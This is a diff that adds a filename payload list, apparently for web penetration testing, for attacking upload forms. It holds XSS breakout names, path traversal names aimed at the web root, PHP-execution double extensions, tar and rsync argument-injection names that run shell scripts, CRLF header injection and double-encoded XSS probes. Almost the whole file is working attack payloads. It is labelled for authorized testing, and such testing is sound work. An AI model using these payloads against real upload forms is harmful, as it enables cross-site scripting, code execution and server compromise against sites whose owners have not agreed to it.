@@ -1,0 +1,31 @@
+# ============================================================================
+# Safe PoC -> x8bitranjit
+# Image FILENAME attack battery - the file content is irrelevant; the NAME is
+# the payload. Authorized testing only.
+#
+# WHERE IT FIRES: upload forms that REFLECT the stored filename (gallery
+# listings, admin media tables, download links, invoice line items) and
+# storage paths built from names.
+# ============================================================================
+# XSS on reflection (pick per context):
+"><img src=x onerror=alert(document.domain)>.png
+"><svg onload=alert(document.domain)>.jpg
+x<img src=x onerror=alert(1)>.png
+# attribute-context breakout:
+" onfocus=alert(document.domain) autofocus x=".png
+# path traversal via name (landing-path control - pairs with PT-011):
+..\..\..\..\var\www\html\poc.php.png        (windows-form)
+../../../../var/www/html/poc.php.png              (unix-form)
+# PHP execution via name (nginx+php-fpm pathinfo / apache handlers):
+shell.php.png
+shell.phtml.png
+# command-injection via name (filenames later globbed into tar/rsync jobs):
+--checkpoint=1.png
+--checkpoint-action=exec=sh shell.sh.png
+-e sh shell.sh.jpg                                 (rsync variant)
+# header/CRLF in Content-Disposition reflection:
+foo.png%0d%0aContent-Length:%200%0d%0a%0d%0a<html>ignored
+# encoding probes (double-encode for sanitizer layers):
+%2522%253E%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E.png
+# ============================================================================
+# confirm: stored name -> reflected context -> matching breakout. benign only.
